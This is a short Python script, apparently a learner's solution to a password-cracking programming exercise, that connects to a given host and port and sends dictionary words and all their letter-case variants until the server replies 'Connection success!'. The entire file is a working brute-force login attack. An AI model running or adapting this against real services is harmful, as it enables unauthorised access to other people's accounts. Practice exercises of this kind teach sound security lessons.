# write your code here
import socket
import sys
import itertools

args = sys.argv
host = args[1]
port = int(args[2])
address = (host, port)


def generate_possible_passwords(key):
    li = [str(x) for x in key]
    li.pop()
    toggles = []
    for i in range(len(li)):
        n = 2 ** i
        ref = {
            "num": n,
            "state": True
        }
        toggles.append(ref)
    for i in range(1, 2 ** len(li) + 1):
        newpassword = ''
        for j in range(len(li)):
            a = toggles[j]
            anum = a["num"]
            astate = a["state"]
            if astate:
                newpassword = newpassword + li[j].upper()
            else:
                newpassword = newpassword + li[j].lower()
            if i % anum == 0:
                toggles[j]["state"] = not toggles[j]["state"]
        yield newpassword


flag = 0
cracked_password = ''
with socket.socket() as sock, open("passwords.txt", "r") as src:
    sock.connect(address)
    for line in src:
        try:
            password = int(line)
        except ValueError:
            password = generate_possible_passwords(line)
        if str(password).isdigit():
            d = str(password)
            sock.send(d.encode())
            resp = sock.recv(1024)
            response = resp.decode()
            if response == "Connection success!":
                cracked_password = d
                flag = 1
                sock.close()
                break
        else:
            for genAttempt in password:
                generated_password = genAttempt.encode()
                sock.send(generated_password)
                resp = sock.recv(1024)
                response = resp.decode()
                if response == "Connection success!":
                    cracked_password = genAttempt
                    flag = 1
                    sock.close()
                    break

        if flag == 1:
            break
    sock.close()

print(cracked_password)
